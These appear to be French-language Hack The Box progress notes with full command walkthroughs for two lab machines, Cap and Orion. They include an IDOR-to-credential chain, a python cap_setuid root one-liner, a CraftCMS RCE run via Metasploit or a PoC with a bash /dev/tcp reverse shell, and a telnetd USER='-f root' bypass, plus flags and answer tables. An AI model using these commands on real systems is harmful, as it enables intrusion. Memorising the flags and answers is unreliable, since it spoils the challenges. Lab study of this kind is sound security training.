**Hack The Box**

**Machines classiques — Notes de progression**

*Méthodologie complète et commandes — après le Starting Point*

Machines Easy/Medium classiques, Sherlocks et Challenges

Résumé des machines

Vue d'ensemble des machines classiques HTB résolues (hors Starting
Point), avec le service et la vulnérabilité principale exploitée pour
chacune.

|             |                                             |                    |                                                 |
|-------------|---------------------------------------------|--------------------|-------------------------------------------------|
| **Machine** | **Service(s)**                              | **Port(s)**        | **Vulnérabilité principale**                    |
| Cap         | FTP + SSH + Web (Flask)                     | 21, 22, 80         | IDOR + capability cap_setuid                    |
| Orion       | SSH + HTTP (CraftCMS 5.6.16) + Telnet local | 22, 80 (+23 local) | CVE-2025-32432 (RCE) + CVE-2026-24061 (telnetd) |

Table des matières

Résumé des machines 2

Machine 1 — CAP 4

Machine 2 — Orion 7

Machine 1 — CAP

**IDOR sur PCAP + capabilities Linux (cap_setuid) — Easy Linux**

Concept

Un dashboard web Flask/Gunicorn permet de lancer un "Security Snapshot"
(capture réseau) et de la télécharger via un ID incrémental. Une IDOR
(Insecure Direct Object Reference) permet d'accéder aux captures des
autres utilisateurs, révélant des identifiants FTP en clair dans un
pcap. La privesc exploite ensuite une capability Linux (cap_setuid)
posée sur l'interpréteur Python.

Méthodologie — commandes complètes

> nmap -sC -sV 10.129.x.x
>
> \# → 21/tcp FTP (vsftpd), 22/tcp SSH, 80/tcp HTTP (Gunicorn, "Security
> Dashboard")
>
> \# Le FTP anonyme est fermé ici — fausse piste, se concentrer sur le
> site web
>
> \# Lancer un "Security Snapshot" sur le site -\> redirection observée
> :
>
> \# http://10.129.x.x/data/\<id\>
>
> \# IDOR : changer l'id pour accéder aux scans des autres utilisateurs
>
> http://10.129.x.x/data/0
>
> \# Télécharger le pcap correspondant :
>
> http://10.129.x.x/data/0/download
>
> \# Analyse du pcap avec Wireshark
>
> wireshark data_0.pcap
>
> \# Filtre : ftp.request.command == "USER" or ftp.request.command ==
> "PASS"
>
> \# -\> identifiants FTP en clair : nathan / Buck3tH4TF0RM3!
>
> \# Le mot de passe FTP est réutilisé pour SSH
>
> ssh nathan@10.129.x.x
>
> \# Password : Buck3tH4TF0RM3!
>
> cat user.txt
>
> \# → 61b0186a70164919f0be2de0139cc03f
>
> \# --- Privilege escalation ---
>
> getcap -r / 2\>/dev/null
>
> \# → /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
>
> \# /usr/bin/ping = cap_net_raw+ep
>
> \# /usr/bin/traceroute6.iputils = cap_net_raw+ep
>
> \# /usr/bin/mtr-packet = cap_net_raw+ep
>
> \# cap_setuid permet à python3.8 de changer son UID vers 0 (root)
>
> /usr/bin/python3.8 -c 'import os; os.setuid(0);
> os.system("/bin/bash")'
>
> whoami \# root
>
> cat /root/root.txt
>
> \# → e7f342183e8016c7e5786586752b50d1

Flags

|          |                                  |
|----------|----------------------------------|
| **Flag** | **Valeur**                       |
| User     | 61b0186a70164919f0be2de0139cc03f |
| Root     | e7f342183e8016c7e5786586752b50d1 |

Réponses aux questions HTB

|                                                 |             |
|-------------------------------------------------|-------------|
| **Question**                                    | **Réponse** |
| How many TCP ports are open?                    | **3**       |
| Path format /\[something\]/\[id\] → something = | **data**    |
| Able to get other users' scans?                 | **yes**     |
| ID of the PCAP with sensitive data              | **0**       |
| Application layer protocol with sensitive data  | **ftp**     |
| Other service where the password works          | **ssh**     |

Points clés

- Une IDOR sur un ID de ressource incrémental (/data/\<id\>) permet
  souvent d'accéder aux données d'autres utilisateurs simplement en
  changeant le nombre — toujours tester id-1, id=0, etc.

- Les fichiers PCAP capturés par une application peuvent contenir des
  identifiants en clair pour des protocoles non chiffrés (FTP, HTTP,
  Telnet) — toujours les analyser avec Wireshark ou tshark après
  IDOR/téléchargement.

- La réutilisation de mot de passe entre FTP et SSH pour un même
  utilisateur est une faille humaine très fréquente.

- Les Linux capabilities (getcap -r /) sont l'équivalent moderne du bit
  SUID, mais accordent des privilèges plus granulaires (ex: cap_setuid,
  cap_net_raw). getcap -r / doit être un réflexe systématique en
  énumération de privesc Linux, au même titre que find / -perm -4000.

- cap_setuid+eip sur un interpréteur (Python, Perl, etc.) permet un
  changement d'UID direct vers 0 depuis un script one-liner, sans
  exploit complexe.

Leçon retenue

*Une simple IDOR sur un numéro d'identifiant, combinée à une capture
réseau contenant des identifiants en clair et une capability Linux mal
restreinte, suffit à obtenir un accès root complet. Les capabilities
Linux méritent la même attention que les binaires SUID lors de toute
énumération de privesc.*

Conclusion générale

Ce que ces machines enseignent, dans l'ordre

- Toujours tester les IDOR sur des identifiants numériques incrémentaux
  exposés dans une URL.

- Analyser systématiquement tout fichier de capture réseau (pcap)
  récupéré avec Wireshark/tshark, en filtrant sur les protocoles non
  chiffrés.

- getcap -r / est aussi important que find / -perm -4000 pour
  l'énumération de privesc Linux moderne.

**Machine 2 — Orion**

*CraftCMS 5.6.16 pre-auth RCE (CVE-2025-32432) + telnetd auth bypass
(CVE-2026-24061) — Easy Linux*

**Concept**

Site web CraftCMS 5.6.16 exposé sur orion.htb. La version est vulnérable
à une RCE pré-authentifiée (CVE-2025-32432) via l’endpoint d’image
transform (object injection Yii2 + empoisonnement de session PHP). Après
obtention d’un shell www-data, le fichier .env révèle les credentials
MySQL. Le hash bcrypt de l’utilisateur adam est cracké (darkangel) et
réutilisé pour SSH. La privesc exploite un telnetd GNU inetutils 2.7
local (127.0.0.1:23) vulnérable à un authentication bypass via la
variable d’environnement USER (CVE-2026-24061).

**Méthodologie — commandes complètes**

echo "10.129.x.x orion.htb" \| sudo tee -a /etc/hosts

nmap -sC -sV 10.129.x.x

\# → 22/tcp SSH (OpenSSH 8.9p1), 80/tcp HTTP (nginx → orion.htb)

\# Version CraftCMS

curl -s http://orion.htb/admin/login \| grep -o "Craft CMS \[0-9.\]\*"

\# → Craft CMS 5.6.16

\# --- Foothold : CVE-2025-32432 (RCE pre-auth) ---

\# Option 1 : Metasploit

msfconsole -q

use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432

set RHOSTS orion.htb

set RPORT 80

set LHOST \<TON_IP_TUN0\>

set LPORT 4444

run

\# → shell www-data

\# Option 2 : PoC Python

git clone https://github.com/c0gnit00/CVE-2025-32432

cd CVE-2025-32432 && pip3 install requests urllib3

python3 exploit.py -u http://orion.htb -c "id"

\# Reverse shell :

python3 exploit.py -u http://orion.htb -c "bash -c 'bash -i \>&
/dev/tcp/\<IP\>/4444 0\>&1'"

\# --- User : adam ---

cat /var/www/html/craft/.env

\# CRAFT_DB_USER=root

\# CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!

\# CRAFT_DB_DATABASE=orion

mysql -u root -p'SuperSecureCraft123Pass!' orion -e "SELECT username,
email, password FROM users;"

\# → hash bcrypt de adam

\# Crack sur Kali

hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

\# → darkangel

ssh adam@orion.htb

\# Password : darkangel

cat /home/adam/user.txt

\# --- Privilege escalation : CVE-2026-24061 ---

ss -tulnp \| grep 23

\# → 127.0.0.1:23 (telnetd)

telnet --version

\# → GNU inetutils 2.7

USER="-f root" telnet -a 127.0.0.1

\# ou : env USER='-f root' telnet -a 127.0.0.1 23

\# → shell root immédiat

cat /root/root.txt

**Flags**

| **Flag** | **Valeur**                                  |
|----------|---------------------------------------------|
| User     | (unique à l’instance — /home/adam/user.txt) |
| Root     | (unique à l’instance — /root/root.txt)      |

**Réponses aux questions HTB**

| **Question**                                                         | **Réponse** |
|----------------------------------------------------------------------|-------------|
| How many open TCP ports are listening on Orion?                      | 2           |
| What is the version of CraftCMS running on the target?               | 5.6.16      |
| Which user is running CraftCMS?                                      | www-data    |
| Which file contains the password for the MySQL database?             | .env        |
| What is the password that can be obtained from the MySQL database?   | darkangel   |
| Which service, unrelated to CraftCMS, is open only locally on Orion? | telnet      |
| What is the version of the service found?                            | 2.7         |

**Points clés**

• Toujours identifier la version exacte d’un CMS (footer, /admin/login,
headers, composer.lock) — elle détermine directement les CVE
applicables.

• CVE-2025-32432 (CraftCMS ≤ 5.6.16) : RCE pre-auth via object injection
Yii2 sur l’endpoint generate-transform + empoisonnement de session PHP.
Metasploit ou PoC public suffisent.

• Le fichier .env de CraftCMS contient presque toujours les credentials
de la base de données en clair — premier réflexe après un shell web.

• Réutilisation de mot de passe entre l’application (Craft admin) et le
système (SSH) : très fréquent sur les boxes Easy.

• Les services qui n’écoutent que sur 127.0.0.1 (telnet, MySQL, etc.)
sont invisibles depuis l’extérieur — toujours ré-énumérer les ports
après avoir un shell.

• CVE-2026-24061 (GNU inetutils telnetd ≤ 2.7) : authentication bypass
trivial via USER="-f root". Un one-liner donne root.

**Leçon retenue**

*Une RCE pre-auth sur un CMS mal patché, combinée à des credentials en
clair dans un .env et à un service legacy local (telnetd) vulnérable à
un bypass trivial, suffit à passer de zéro à root en quelques étapes.
Toujours vérifier les services locaux et les fichiers de configuration
d’application après un premier shell.*

**Ce que ces machines enseignent (suite)**

• Toujours fingerprint la version exacte d’un CMS / framework — elle
conditionne les CVE exploitables.

• Après un shell web, lire systématiquement les fichiers .env,
config.php, database.yml, etc.

• Ré-énumérer les ports locaux (ss -tulnp) : les services 127.0.0.1 sont
souvent le chemin vers root.

• Les services legacy (telnetd, rsh, etc.) exposés localement restent
des vecteurs de privesc très efficaces.

*Prochaine machine à documenter ici dès qu’elle sera résolue.*
